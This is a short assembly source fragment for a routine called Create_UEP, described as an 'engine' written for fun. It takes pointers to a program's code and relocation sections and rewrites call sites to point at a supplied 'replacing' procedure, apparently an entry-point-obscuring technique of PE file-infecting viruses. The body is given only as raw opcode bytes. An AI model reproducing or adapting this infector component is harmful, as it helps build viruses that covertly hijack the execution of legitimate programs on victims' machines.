;It "engine" I have written for fun;)
;-----------------------------------------------------------------------------
;Create_UEP(
;	dword   VO			// virtual offset   		
;	*dword  code			// offset to .code section(already has read)  		
;	*dword  reloc   		// offset to .reloc section(already has read)  		
;	dword   num_records	        // count of records in table to rewrite
;       *dword  adr_modify		// address of "replasing" proc
;       *dword  mask_table              // pointer to a mask table
;        );
;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
Create_UEP:
db 060h,08Bh,074h,024h,02Ch,08Bh,07Ch,024h,028h,081h,0EFh,000h,010h,000h,000h
db 003h,03Eh,08Bh,046h,004h,0BAh,008h,000h,000h,000h,052h,02Bh,0C2h,099h,0B9h
db 002h,000h,000h,000h,066h,0F7h,0F1h,05Ah,091h,00Fh,0B7h,004h,016h,066h,025h
db 0FFh,00Fh,003h,0C7h,056h,051h,093h,08Bh,074h,024h,040h,033h,0C0h,0ACh,00Fh
db 0B6h,0C8h,066h,0ADh,00Bh,0C0h,074h,012h,049h,074h,008h,066h,039h,043h,0FEh
db 074h,026h,0EBh,005h,038h,043h,0FEh,074h,01Fh,0EBh,0E4h,059h,05Eh,083h,0C2h
db 002h,0E2h,0CAh,08Bh,046h,004h,003h,0F0h,099h,033h,0D2h,0BBh,000h,010h,000h
db 000h,0F7h,0F3h,00Bh,0D2h,074h,095h,0F9h,0EBh,02Dh,093h,059h,05Eh,051h,057h
db 0F8h,08Dh,05Ch,024h,038h,0FFh,00Bh,08Bh,00Bh,0E3h,01Bh,048h,048h,08Bh,0D8h
db 02Bh,0C7h,003h,006h,087h,0DFh,093h,056h,08Bh,074h,024h,030h,08Bh,044h,024h
db 040h,0FFh,0D0h,05Eh,05Fh,059h,0EBh,0BAh,05Fh,059h,061h,0C2h,018h,000h 
